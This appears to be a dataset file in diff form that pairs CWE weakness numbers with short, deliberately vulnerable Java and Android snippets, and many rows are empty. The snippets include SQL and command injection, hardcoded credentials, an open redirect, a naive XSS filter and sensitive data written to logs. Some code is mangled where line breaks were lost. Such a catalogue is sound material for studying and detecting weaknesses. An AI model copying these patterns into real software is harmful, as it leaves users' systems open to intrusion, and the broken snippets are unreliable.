@@ -1,0 +1,4129 @@
+477,null
+477, String cmd = null;
+...
+cmd = Environment.GetEnvironmentVariable("cmd");
+cmd = cmd.Trim();
+
+477, ...
+String name = new String(nameBytes, highByte);
+...
+
+749, public void removeDatabase(String databaseName) {      try {            Statement stmt = conn.createStatement();
+stmt.execute("DROP DATABASE " + databaseName);
+       } catch (SQLException ex) {...
+}   }
+749,// Android @Overridepublic boolean shouldOverrideUrlLoading(WebView view, String url){      if (url.substring(0,14).equalsIgnoreCase("examplescheme:")){       if(url.substring(14,25).equalsIgnoreCase("getUserInfo")){         writeDataToView(view, UserData);
+return false;
+    }else{         return true;
+    }   }   }
+749,null
+749, public class WebViewGUI extends Activity {      WebView mainWebView;
+ public void onCreate(Bundle savedInstanceState) {       super.onCreate(savedInstanceState);
+mainWebView = new WebView(this);
+mainWebView.getSettings().setJavaScriptEnabled(true);
+mainWebView.addJavascriptInterface(new JavaScriptInterface(), "userInfoObject");
+mainWebView.loadUrl("file:///android_asset/www/index.html");
+setContentView(mainWebView);
+   } final class JavaScriptInterface {            JavaScriptInterface () {} public String getUserInfo() {           return currentUser.Info();
+     }       }   }
+749, final class JavaScriptInterface {      JavaScriptInterface () { } @JavascriptInterfacepublic String getUserInfo() {       return currentUser.Info();
+   }   }
+117, String val = request.getParameter("val");
+try {   int value = Integer.parseInt(val);
+   }catch (NumberFormatException) {   log.info("Failed to parse val = " + val);
+ }...
+
+223,null
+224,null
+532, logger.info("Username: " + usernme + ", CCN: " + ccn);
+
+532, locationClient = new LocationClient(this, this, this);
+locationClient.connect();
+currentUser.setLocation(locationClient.getLastLocation());
+ ...
+  catch (Exception e) {   AlertDialog.Builder builder = new AlertDialog.Builder(this);
+builder.setMessage("Sorry, this application has experienced an error.");
+AlertDialog alert = builder.create();
+alert.show();
+Log.e("ExampleActivity", "Caught exception: " + e + " While on User:" + User.toString());
+ }
+532, public BankAccount getUserBankAccount(String username, String accountNumber) {      BankAccount userAccount = null;
+String query = null;
+try {       if (isAuthorizedUser(username)) {         query = "SELECT * FROM accounts WHERE owner = "+ username + " AND accountID = " + accountNumber;
+DatabaseManager dbManager = new DatabaseManager();
+Connection conn = dbManager.getConnection();
+Statement stmt = conn.createStatement();
+ResultSet queryResult = stmt.executeQuery(query);
+userAccount = (BankAccount)queryResult.getObject(accountNumber);
+    }   } catch (SQLException ex) {       String logMessage = "Unable to retrieve account information from database,\nquery: " + query;
+Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);
+   }return userAccount;
+   }
+778,null
+778, if LoginUser(){    // Login successful RunProgram();
+  } else {    // Login unsuccessful LoginRetry();
+  }
+778,null
+290, String sourceIP = request.getRemoteAddr();
+if (sourceIP != null &amp;
+&amp;
+ sourceIP.equals(APPROVED_IP)) {   authenticated = true;
+ }
+290,null
+290, while(true) {      DatagramPacket rp=new DatagramPacket(rData,rData.length);
+outSock.receive(rp);
+String in = new String(p.getData(),0, rp.getLength());
+InetAddress clientIPAddress = rp.getAddress();
+int port = rp.getPort();
+ if (isTrustedAddress(clientIPAddress) &amp;
+ secretKey.equals(in)) {       out = secret.getBytes();
+DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port);
+ outSock.send(sp);
+   }   }
+290,null
+290, String ip = request.getRemoteAddr();
+InetAddress addr = InetAddress.getByName(ip);
+if (addr.getCanonicalHostName().endsWith("trustme.com")) {   trusted = true;
+ }
+290,null
+295,null
+295,null
+295,null
+295,null
+295,null
+296,null
+299,null
+306, public BankAccount createBankAccount(String accountNumber, String accountType,String accountName, String accountSSN, double balance) {      BankAccount account = new BankAccount();
+account.setAccountNumber(accountNumber);
+account.setAccountType(accountType);
+account.setAccountOwnerName(accountName);
+account.setAccountOwnerSSN(accountSSN);
+account.setBalance(balance);
+ return account;
+   }
+306,null
+307, String username = request.getParameter("username");
+String password = request.getParameter("password");
+ int authResult = authenticateUser(username, password);
+
+307,null
+307,null
+308,null
+308, String plainText = new String(plainTextIn);
+MessageDigest encer = MessageDigest.getInstance("SHA");
+encer.update(plainTextIn);
+byte[] digest = password.digest();
+ //Login if hash matches stored hash if (equal(digest,secret_password())) {   login_user();
+ }
+309,null
+309, String plainText = new String(plainTextIn);
+MessageDigest encer = MessageDigest.getInstance("SHA");
+encer.update(plainTextIn);
+byte[] digest = password.digest();
+ //Login if hash matches stored hash if (equal(digest,secret_password())) {   login_user();
+ }
+1220,null
+478,null
+478, public static final String INTEREST_RATE_AT_ZERO_POINTS = "5.00";
+public static final String INTEREST_RATE_AT_ONE_POINTS = "4.75";
+public static final String INTEREST_RATE_AT_TWO_POINTS = "4.50";
+...
+public BigDecimal getInterestRate(int points) {      BigDecimal result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);
+ switch (points) {            case 0:           result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);
+break;
+      case 1:           result = new BigDecimal(INTEREST_RATE_AT_ONE_POINTS);
+break;
+      case 2:           result = new BigDecimal(INTEREST_RATE_AT_TWO_POINTS);
+break;
+            }return result;
+   }
+478,null
+478, let step = input1 + input2;
+ switch(step) {    case 1:      alert("Process step 1.");
+ break;
+   case 2:      alert("Process step 2.");
+ break;
+   case 3:      alert("Process step 3.");
+ break;
+    } // program execution continues...
+
+478,null
+487, package math;
+public class Lebesgue implements Integration{      public final Static String youAreHidingThisFunction(functionToIntegrate){       return ...
+;
+       }   }
+489,null
+546, if (user == null) {    // TODO: Handle null user condition.    }
+547,null
+547,null
+561,null
+561, public class DoubleDead {   private void doTweedledee() {     doTweedledumb();
+  }private void doTweedledumb() {     doTweedledee();
+  }public static void main(String[] args) {     System.out.println("running DoubleDead");
+  } }
+561, public class Dead {      String glue;
+ public String getGlue() {       return "glue";
+   }   }
+563,null
+586, // time to clean up widget.finalize();
+
+605,null
+628,null
+628,null
+628, private static final String[] ADMIN_ROLES = ...
+;
+public boolean void accessGranted(String resource, String user) {   String[] userRoles = getUserRoles(user);
+return accessGranted(resource, ADMIN_ROLES);
+ } private boolean void accessGranted(String resource, String[] userRoles) {    // grant or deny access based on user roles ...
+   }
+1041, public class Main {   public static void main(String[] args) {      double s = 10.0;
+ double r = 1.0;
+ double pi = 3.14159;
+ double surface_area;
+ if(r > 0.0) {        // complex math equations surface_area = pi * r * s + pi * Math.pow(r, 2);
+    } if(r > 1.0) {        // a complex set of math surface_area = pi * r * s + pi * Math.pow(r, 2);
+    }   }  }
+1116,public class Main { public static void main(String[] args) {    int pt_weight = 83;
+ int mg_per_kg = 3;
+ int daily_dose = 0;
+  // Add the patient weight and Mg/Kg to calculate the correct daily dose daily_dose = pt_weight * mg_per_kg;
+ return dosage;
+  } }
+1235, Long count = 0L;
+  for (long i = 0;
+ i < Integer.MAX_VALUE;
+ i++) {    count += i;
+   }
+179, String path = getInputPath();
+if (path.startsWith("/safe_dir/")){   File f = new File(path);
+return f.getCanonicalPath();
+ }
+179,null
+408,null
+480,null
+480,null
+480,null
+484, public void printMessage(int month){      switch (month) {       case 1: print("January");
+case 2: print("February");
+case 3: print("March");
+case 4: print("April");
+case 5: print("May");
+case 6: print("June");
+case 7: print("July");
+case 8: print("August");
+case 9: print("September");
+case 10: print("October");
+case 11: print("November");
+case 12: print("December");
+       }println(" is a great month");
+   }
+484,null
+698,null
+783,null
+783, public double calculateReturnOnInvestment(double currentValue, double initialInvestment) {   double returnROI = 0.0;
+  // calculate return on investment returnROI = currentValue - initialInvestment / initialInvestment;
+ return returnROI;
+   }
+835,null
+835, public boolean isReorderNeeded(String bookISBN, int rateSold) {   boolean isReorder = false;
+ int minimumCount = 10;
+int days = 0;
+  // get inventory count for book int inventoryCount = inventory.getIventoryCount(bookISBN);
+  // find number of days until inventory count reaches minimum while (inventoryCount > minimumCount) {       inventoryCount = inventoryCount - rateSold;
+days++;
+       }  // if number of days within reorder timeframe   // set reorder return boolean to true if (days > 0 &amp;
+&amp;
+ days < 5) {       isReorder = true;
+   } return isReorder;
+   }
+841,null
+1025, String str1 = new String("Hello");
+String str2 = new String("Hello");
+if (str1 == str2) {   System.out.println("str1 == str2");
+ }
+283,null
+770,null
+770,null
+770,null
+770, public void acceptConnections() {      try {       ServerSocket serverSocket = new ServerSocket(SERVER_PORT);
+int counter = 0;
+boolean hasConnections = true;
+while (hasConnections) {         Socket client = serverSocket.accept();
+Thread t = new Thread(new ClientSocketThread(client));
+t.setName(client.getInetAddress().getHostName() + ":" + counter++);
+t.start();
+    }serverSocket.close();
+     } catch (IOException ex) {...
+}   }
+770,null
+841,null
+346, IntentFilter filter = new IntentFilter("com.example.RemoveUser");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ public class DeleteReceiver extends BroadcastReceiver {   @Overridepublic void onReceive(Context context, Intent intent) {     int userID = intent.getIntExtra("userID");
+destroyUserData(userID);
+  } }
+346,// Android @Overridepublic boolean shouldOverrideUrlLoading(WebView view, String url){      if (url.substring(0,14).equalsIgnoreCase("examplescheme:")){       if(url.substring(14,25).equalsIgnoreCase("getUserInfo")){         writeDataToView(view, UserData);
+return false;
+    }else{         return true;
+    }   }   }
+346,null
+385,null
+940, IntentFilter filter = new IntentFilter("com.example.RemoveUser");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ public class DeleteReceiver extends BroadcastReceiver {   @Overridepublic void onReceive(Context context, Intent intent) {     int userID = intent.getIntExtra("userID");
+destroyUserData(userID);
+  } }
+940,// Android @Overridepublic boolean shouldOverrideUrlLoading(WebView view, String url){      if (url.substring(0,14).equalsIgnoreCase("examplescheme:")){       if(url.substring(14,25).equalsIgnoreCase("getUserInfo")){         writeDataToView(view, UserData);
+return false;
+    }else{         return true;
+    }   }   }
+940,null
+941,null
+363,null
+366,null
+366, public classRace {      static int foo = 0;
+public static void main() {       new Threader().start();
+foo = 1;
+       }public static class Threader extends Thread {       public void run() {           System.out.println(foo);
+     }       }   }
+367,null
+367,null
+367,null
+367,null
+567, public static class Counter extends HttpServlet {   static int count = 0;
+protected void doGet(HttpServletRequest in, HttpServletResponse out)throws ServletException, IOException {     out.setContentType("text/plain");
+PrintWriter p = out.getWriter();
+count++;
+p.println(count + " hits so far!");
+  } }
+585, synchronized(this) { }
+820,null
+256, ...
+Properties prop = new Properties();
+prop.load(new FileInputStream("config.properties"));
+String password = prop.getProperty("password");
+DriverManager.getConnection(url, usr, password);
+...
+
+256, ...
+String password = regKey.GetValue(passKey).toString();
+NetworkCredential netCred = new NetworkCredential(username,password,domain);
+...
+
+256, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+256,null
+257,null
+257, int VerifyAdmin(String password) {   if (passwd.Equals(compress(password), compressed_password)) {     return(0);
+  } //Diagnostic Mode return(1);
+ }
+257, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+257,null
+260, webapp.ldap.username = secretUsernamewebapp.ldap.password = secretPassword
+260, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+260,null
+261, ...
+Properties prop = new Properties();
+prop.load(new FileInputStream("config.properties"));
+String password = Base64.decode(prop.getProperty("password"));
+DriverManager.getConnection(url, usr, password);
+...
+
+261,null
+324,null
+620,null
+798, ...
+DriverManager.getConnection(url, "scott", "tiger");
+...
+
+798,null
+798, int VerifyAdmin(String password) {   if (!password.equals("Mew!")) {     return(0)  }//Diagnostic Modereturn(1);
+ }
+798,null
+798, public boolean VerifyAdmin(String password) {   if (password.equals("68af404b513073584c4b6f22b6c63e6b")) {     System.out.println("Entering Diagnostic Mode...
+");
+return true;
+  }System.out.println("Incorrect Password!");
+return false;
+ 
+798,null
+798, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+798,null
+261, ...
+Properties prop = new Properties();
+prop.load(new FileInputStream("config.properties"));
+String password = Base64.decode(prop.getProperty("password"));
+DriverManager.getConnection(url, usr, password);
+...
+
+261,null
+324,null
+328,null
+328, String plainText = new String(plainTextIn);
+MessageDigest encer = MessageDigest.getInstance("SHA");
+encer.update(plainTextIn);
+byte[] digest = password.digest();
+ //Login if hash matches stored hash if (equal(digest,secret_password())) {   login_user();
+ }
+331,null
+331, String GenerateReceiptURL(String baseUrl) {   Random ranGen = new Random();
+ranGen.setSeed((new Date()).getTime());
+return(baseUrl + ranGen.nextInt(400000000) + ".html");
+ }
+334,null
+338, Random random = new Random(System.currentTimeMillis());
+int accountID = random.nextInt();
+
+338,null
+347, File f = new File(downloadedFilePath);
+JarFile jf = new JarFile(f);
+
+1240,null
+321,null
+321, public boolean VerifyAdmin(String password) {   if (password.equals("68af404b513073584c4b6f22b6c63e6b")) {     System.out.println("Entering Diagnostic Mode...
+");
+return true;
+  }System.out.println("Incorrect Password!");
+return false;
+ 
+321,null
+323,null
+323,null
+324,null
+346, IntentFilter filter = new IntentFilter("com.example.RemoveUser");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ public class DeleteReceiver extends BroadcastReceiver {   @Overridepublic void onReceive(Context context, Intent intent) {     int userID = intent.getIntExtra("userID");
+destroyUserData(userID);
+  } }
+346,// Android @Overridepublic boolean shouldOverrideUrlLoading(WebView view, String url){      if (url.substring(0,14).equalsIgnoreCase("examplescheme:")){       if(url.substring(14,25).equalsIgnoreCase("getUserInfo")){         writeDataToView(view, UserData);
+return false;
+    }else{         return true;
+    }   }   }
+346,null
+347, File f = new File(downloadedFilePath);
+JarFile jf = new JarFile(f);
+
+348,null
+353, while(true) {   DatagramPacket rp = new DatagramPacket(rData,rData.length);
+outSock.receive(rp);
+InetAddress IPAddress = rp.getAddress();
+int port = rp.getPort();
+out = secret.getBytes();
+DatagramPacket sp =new DatagramPacket(out, out.length, IPAddress, port);
+outSock.send(sp);
+ }
+354,null
+354, while(true) {   DatagramPacket packet = new DatagramPacket(data,data.length,IPAddress, port);
+socket.send(sendPacket);
+ }
+494, URL[] classURLs= new URL[]{   new URL("file:subdir/") };
+URLClassLoader loader = new URLClassLoader(classURLs);
+Class loadedClass = Class.forName("loadMe", true, loader);
+
+494,null
+565, Cookie[] cookies = request.getCookies();
+for (int i =0;
+ i< cookies.length;
+ i++) {   Cookie c = cookies[i];
+if (c.getName().equals("role")) {     userRole = c.getValue();
+  } }
+829,null
+130,null
+178, public String preventXSS(String input, String mask) {   return input.replaceAll("script", mask);
+ }
+233, ...
+ IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ ...
+  public class UrlHandlerReceiver extends BroadcastReceiver {      @Overridepublic void onReceive(Context context, Intent intent) {            if("com.example.URLHandler.openURL".equals(intent.getAction())) {           String URL = intent.getStringExtra("URLToOpen");
+int length = URL.length();
+       ...
+ }       }   }
+471, String[] colors = car.getAllPossibleColors();
+colors[0] = "Red";
+
+472, String accountID = request.getParameter("accountID");
+User user = getUserFromID(Long.parseLong(accountID));
+
+472,null
+601,null
+601, public class RedirectServlet extends HttpServlet {      protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {       String query = request.getQueryString();
+if (query.contains("url")) {         String url = request.getParameter("url");
+response.sendRedirect(url);
+    }   }   }
+78,null
+78,null
+78,null
+78, String script = System.getProperty("SCRIPTNAME");
+if (script != null)   System.exec(script);
+ 
+78, public String coordinateTransformLatLonToUTM(String coordinates){      String utmCoords = null;
+try {            String latlonCoords = coordinates;
+Runtime rt = Runtime.getRuntime();
+Process exec = rt.exec("cmd.exe /C latlon2utm.exe -" + latlonCoords);
+ // process results of coordinate transform   // ...
+        }catch(Exception e) {...
+}return utmCoords;
+   }
+78, ...
+String btype = request.getParameter("backuptype");
+String cmd = new String("cmd.exe /K \"   c:\\util\\rmanDB.bat "+btype+"&amp;
+&amp;
+c:\\utl\\cleanup.bat\"")  System.Runtime.getRuntime().exec(cmd);
+...
+
+79,null
+79,null
+79,null
+79,null
+79,null
+79,null
+79,null
+79,null
+88,null
+89,null
+89,null
+89,null
+89,null
+89,null
+90, context = new InitialDirContext(env);
+String searchFilter = "StreetAddress=" + address;
+NamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls);
+
+93, logger.info("User's street address: " + request.getParameter("streetAddress"));
+
+117, String val = request.getParameter("val");
+try {   int value = Integer.parseInt(val);
+   }catch (NumberFormatException) {   log.info("Failed to parse val = " + val);
+ }...
+
+462,null
+643, XPath xpath = XPathFactory.newInstance().newXPath();
+XPathExpression xlogin = xpath.compile("//users/user[login/text()='" + login.getUserName() + "' and password/text() = '" + login.getPassword() + "']/home_dir/text()");
+Document d = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(new File("db.xml"));
+String homedir = xlogin.evaluate(d);
+
+791,null
+795,null
+795,null
+838,null
+23,null
+23,null
+23, public class FileUploadServlet extends HttpServlet {      ...
+ protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {            response.setContentType("text/html");
+PrintWriter out = response.getWriter();
+String contentType = request.getContentType();
+ // the starting position of the boundary headerint ind = contentType.indexOf("boundary=");
+String boundary = contentType.substring(ind+9);
+ String pLine = new String();
+String uploadLocation = new String(UPLOAD_DIRECTORY_STRING);
+ //Constant value // verify that content type is multipart form dataif (contentType != null &amp;
+&amp;
+ contentType.indexOf("multipart/form-data") != -1) {                  // extract the filename from the Http headerBufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));
+...
+pLine = br.readLine();
+String filename = pLine.substring(pLine.lastIndexOf("\\"), pLine.lastIndexOf("\""));
+...
+ // output the file to the local upload directorytry {                        BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));
+for (String line;
+ (line=br.readLine())!=null;
+ ) {                   if (line.indexOf(boundary) == -1) {                     bw.write(line);
+bw.newLine();
+bw.flush();
+          }         } //end of for loopbw.close();
+                 } catch (IOException ex) {...
+}// output successful upload response HTML page           }// output unsuccessful upload response HTML pageelse{...
+}       }       ...
+      }
+36, String filename = System.getProperty("com.domain.application.dictionaryFile");
+File dictionaryFile = new File(filename);
+
+378,null
+378, try {   File temp = File.createTempFile("pattern", ".suffix");
+temp.deleteOnExit();
+BufferedWriter out = new BufferedWriter(new FileWriter(temp));
+out.write("aString");
+out.close();
+ }catch (IOException e) {}
+379,null
+379, try {   File temp = File.createTempFile("pattern", ".suffix");
+temp.deleteOnExit();
+BufferedWriter out = new BufferedWriter(new FileWriter(temp));
+out.write("aString");
+out.close();
+ }catch (IOException e) {}
+426,null
+426,null
+426, ...
+System.Runtime.getRuntime().exec("make");
+...
+
+427, ...
+System.Runtime.getRuntime().exec("make");
+...
+
+428,null
+209, try {   /...
+/ }catch (Exception e) {   System.out.println(e);
+ }
+209,null
+209,null
+209, public BankAccount getUserBankAccount(String username, String accountNumber) {      BankAccount userAccount = null;
+String query = null;
+try {       if (isAuthorizedUser(username)) {         query = "SELECT * FROM accounts WHERE owner = "+ username + " AND accountID = " + accountNumber;
+DatabaseManager dbManager = new DatabaseManager();
+Connection conn = dbManager.getConnection();
+Statement stmt = conn.createStatement();
+ResultSet queryResult = stmt.executeQuery(query);
+userAccount = (BankAccount)queryResult.getObject(accountNumber);
+    }   } catch (SQLException ex) {       String logMessage = "Unable to retrieve account information from database,\nquery: " + query;
+Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);
+   }return userAccount;
+   }
+248, protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {   String ip = req.getRemoteAddr();
+InetAddress addr = InetAddress.getByName(ip);
+...
+out.println("hello " + addr.getHostName());
+ }
+252,null
+252,null
+252,null
+252,null
+252, FileInputStream fis;
+byte[] byteArray = new byte[1024];
+for (Iterator i=users.iterator();
+ i.hasNext();
+) {      String userName = (String) i.next();
+String pFileName = PFILE_ROOT + "/" + userName;
+FileInputStream fis = new FileInputStream(pFileName);
+fis.read(byteArray);
+ // the file is always 1k bytesfis.close();
+processPFile(userName, byteArray);
+   
+252, String itemName = request.getParameter(ITEM_NAME);
+if (itemName.compareTo(IMPORTANT_ITEM) == 0) {   ...
+ }...
+
+252, String itemName = request.Item(ITEM_NAME);
+if (itemName.Equals(IMPORTANT_ITEM)) {   ...
+ }...
+
+252, System.clearProperty("os.name");
+...
+String os = System.getProperty("os.name");
+if (os.equalsIgnoreCase("Windows 95")) System.out.println("Not supported");
+
+252,null
+252,null
+252,null
+253,null
+390,null
+390,null
+390, public String readFile(String filename) {      String retString = null;
+try {            // initialize File and FileReader objectsFile file = new File(filename);
+FileReader fr = new FileReader(file);
+ // initialize character bufferlong fLen = file.length();
+char[] cBuf = new char[(int) fLen];
+ // read data from fileint iRead = fr.read(cBuf, 0, (int) fLen);
+ // close filefr.close();
+ retString = new String(cBuf);
+       } catch (Exception ex) {       /* do nothing, but catch so it'll compile...
+ */   }return retString;
+   }
+391, try {   doExchange();
+ }catch (RareException e) {    // this can never happen    }
+392, try {    // Something that may throw an exception. ...
+   } catch (Throwable t) {   logger.error("Caught: " + t.toString());
+return;
+ }
+393, try {    // something that might throw IOException ...
+   } catch (IOException ioe) {   response.sendError(SC_NOT_FOUND);
+ }
+395, try {    mysteryMethod();
+  } catch (NullPointerException npe) { }
+396,null
+397,null
+397,null
+584, try {   ...
+throw IllegalArgumentException();
+ }finally {   return r;
+ }
+600, protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {   String ip = req.getRemoteAddr();
+InetAddress addr = InetAddress.getByName(ip);
+...
+out.println("hello " + addr.getHostName());
+ }
+617, String email = request.getParameter("email_address");
+assert email != null;
+
+756, Public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {   try {     ...
+  } catch (ApplicationSpecificException ase) {     logger.error("Caught: " + ase.toString());
+  } }
+756,null
+1069, public class Main {   public static void main(String[] args) {      int a = 1;
+ int b = 0;
+ int c = 0;
+ try {        c = a / b;
+    } catch(ArithmeticException ae) { }   }  }
+480,null
+480,null
+480,null
+570,public void updateUserAccountOrder(String productNumber, String accountNumber) {      boolean isValidProduct = false;
+boolean isValidAccount = false;
+ if (validProductNumber(productNumber)) {       isValidProduct = true;
+updateInventory(productNumber);
+   }else {       return;
+   } if (validAccountNumber(accountNumber)) {       isValidProduct = true;
+updateAccount(accountNumber, productNumber);
+   } if (isValidProduct &amp;
+&amp;
+ isValidAccount) {       updateAccountOrder(accountNumber, productNumber);
+   }   }
+570,null
+570,null
+571,public void updateInventory(String productNumber) {      boolean isProductAvailable = false;
+boolean isDelayed = false;
+ if (productInStore(productNumber)) {       isProductAvailable = true;
+updateInStoreDatabase(productNumber);
+   }else if (productInWarehouse(productNumber)) {       isProductAvailable = true;
+updateInWarehouseDatabase(productNumber);
+   }else {       isProductAvailable = true;
+   } if ( isProductAvailable ) {       updateProductDatabase(productNumber);
+   }else if ( isDelayed ) {        /* Warn customer about delay before order processing */ ...
+       }   }
+588,null
+595, String str1 = new String("Hello");
+String str2 = new String("Hello");
+if (str1 == str2) {   System.out.println("str1 == str2");
+ }
+595, public boolean isSameAccount(BankAccount accountA, BankAccount accountB) {   return accountA == accountB;
+ }
+783,null
+783, public double calculateReturnOnInvestment(double currentValue, double initialInvestment) {   double returnROI = 0.0;
+  // calculate return on investment returnROI = currentValue - initialInvestment / initialInvestment;
+ return returnROI;
+   }
+431, protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {   String ip = req.getRemoteAddr();
+InetAddress addr = InetAddress.getByName(ip);
+...
+out.println("hello " + addr.getHostName());
+ }
+433,null
+433,null
+434,null
+434, public class FileUploadServlet extends HttpServlet {      ...
+ protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {            response.setContentType("text/html");
+PrintWriter out = response.getWriter();
+String contentType = request.getContentType();
+ // the starting position of the boundary headerint ind = contentType.indexOf("boundary=");
+String boundary = contentType.substring(ind+9);
+ String pLine = new String();
+String uploadLocation = new String(UPLOAD_DIRECTORY_STRING);
+ //Constant value // verify that content type is multipart form dataif (contentType != null &amp;
+&amp;
+ contentType.indexOf("multipart/form-data") != -1) {                  // extract the filename from the Http headerBufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));
+...
+pLine = br.readLine();
+String filename = pLine.substring(pLine.lastIndexOf("\\"), pLine.lastIndexOf("\""));
+...
+ // output the file to the local upload directorytry {                        BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));
+for (String line;
+ (line=br.readLine())!=null;
+ ) {                   if (line.indexOf(boundary) == -1) {                     bw.write(line);
+bw.newLine();
+bw.flush();
+          }         } //end of for loopbw.close();
+                 } catch (IOException ex) {...
+}// output successful upload response HTML page           }// output unsuccessful upload response HTML pageelse{...
+}       }       ...
+      }
+204,null
+209, try {   /...
+/ }catch (Exception e) {   System.out.println(e);
+ }
+209,null
+209,null
+209, public BankAccount getUserBankAccount(String username, String accountNumber) {      BankAccount userAccount = null;
+String query = null;
+try {       if (isAuthorizedUser(username)) {         query = "SELECT * FROM accounts WHERE owner = "+ username + " AND accountID = " + accountNumber;
+DatabaseManager dbManager = new DatabaseManager();
+Connection conn = dbManager.getConnection();
+Statement stmt = conn.createStatement();
+ResultSet queryResult = stmt.executeQuery(query);
+userAccount = (BankAccount)queryResult.getObject(accountNumber);
+    }   } catch (SQLException ex) {       String logMessage = "Unable to retrieve account information from database,\nquery: " + query;
+Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);
+   }return userAccount;
+   }
+212,null
+213,null
+214, String keystorePass = System.getProperty("javax.net.ssl.keyStorePassword");
+if (keystorePass == null) {   System.err.println("ERROR: Keystore password not specified.");
+System.exit(-1);
+ } ...
+
+215,null
+312, response.addCookie( new Cookie("userAccountID", acctID);
+
+312,null
+312,null
+312, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+312,null
+312,null
+312,null
+312,null
+319, try {   URL u = new URL("http://www.secret.example.org/");
+HttpURLConnection hu = (HttpURLConnection) u.openConnection();
+hu.setRequestMethod("PUT");
+hu.connect();
+OutputStream os = hu.getOutputStream();
+hu.disconnect();
+ }catch (IOException e) { //...
+  }
+319,null
+359,null
+359,null
+359, locationClient = new LocationClient(this, this, this);
+locationClient.connect();
+Location userCurrLocation;
+userCurrLocation = locationClient.getLastLocation();
+deriveStateFromCoords(userCurrLocation);
+
+497,null
+497,null
+497, try {   ...
+ } catch (Exception e) {   e.printStackTrace();
+ }
+497,null
+497,null
+532, logger.info("Username: " + usernme + ", CCN: " + ccn);
+
+532, locationClient = new LocationClient(this, this, this);
+locationClient.connect();
+currentUser.setLocation(locationClient.getLastLocation());
+ ...
+  catch (Exception e) {   AlertDialog.Builder builder = new AlertDialog.Builder(this);
+builder.setMessage("Sorry, this application has experienced an error.");
+AlertDialog alert = builder.create();
+alert.show();
+Log.e("ExampleActivity", "Caught exception: " + e + " While on User:" + User.toString());
+ }
+532, public BankAccount getUserBankAccount(String username, String accountNumber) {      BankAccount userAccount = null;
+String query = null;
+try {       if (isAuthorizedUser(username)) {         query = "SELECT * FROM accounts WHERE owner = "+ username + " AND accountID = " + accountNumber;
+DatabaseManager dbManager = new DatabaseManager();
+Connection conn = dbManager.getConnection();
+Statement stmt = conn.createStatement();
+ResultSet queryResult = stmt.executeQuery(query);
+userAccount = (BankAccount)queryResult.getObject(accountNumber);
+    }   } catch (SQLException ex) {       String logMessage = "Unable to retrieve account information from database,\nquery: " + query;
+Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);
+   }return userAccount;
+   }
+226,null
+226,null
+454, int debugLevel = Integer.getInteger("com.domain.application.debugLevel").intValue();
+
+454,null
+455,null
+459, try {   InputStream is = new FileInputStream(path);
+byte b[] = new byte[is.available()];
+is.read(b);
+is.close();
+ } catch (Throwable t) {   log.error("Something bad happened: " + t.getMessage());
+ }
+460, public class foo {      public static final void main( String args[] ) {       boolean returnValue;
+returnValue=doStuff();
+       }public static final boolean doStuff( ) {       boolean threadLock;
+boolean truthvalue=true;
+try {           while( //check some condition ) {               threadLock=true;
+ //do some stuff to truthvaluethreadLock=false;
+               }           }catch (Exception e){           System.err.println("You did something bad");
+if (something) return truthvalue;
+           }return truthvalue;
+       }   }
+112, // Read DOM try {   ...
+DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+factory.setValidating( false );
+...
+.c_dom = factory.newDocumentBuilder().parse( xmlFile );
+ } catch(Exception ex) {   ...
+ }
+112, DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();
+builderFactory.setNamespaceAware(true);
+DocumentBuilder builder = builderFactory.newDocumentBuilder();
+
+129, public String getValue(int index) {   return array[index];
+ }
+129, private void buildList ( int untrustedListSize ){   if ( 0 > untrustedListSize ){     die("Negative value supplied for list size, die evil hacker!");
+  }Widget[] list = new Widget [ untrustedListSize ];
+list[0] = new Widget();
+ }
+129,null
+129,null
+129, // Method called from servlet to obtain product information public String displayProductSummary(int index) {      String productSummary = new String("");
+ try {       String productSummary = getProductSummary(index);
+     } catch (Exception ex) {...
+} return productSummary;
+   } public String getProductSummary(int index) {   return products[index];
+ }
+129,null
+179, String path = getInputPath();
+if (path.startsWith("/safe_dir/")){   File f = new File(path);
+return f.getCanonicalPath();
+ }
+179,null
+184, public String removeScriptTags(String input, String mask) {   return input.replaceAll("script", mask);
+ }
+606,null
+606,null
+786,null
+786,null
+786,null
+788,null
+788,null
+788,null
+788,null
+190,null
+190,null
+190,null
+190,null
+191,null
+191,null
+192,null
+192,null
+193,null
+193,null
+193,null
+193,null
+197,null
+197, ...
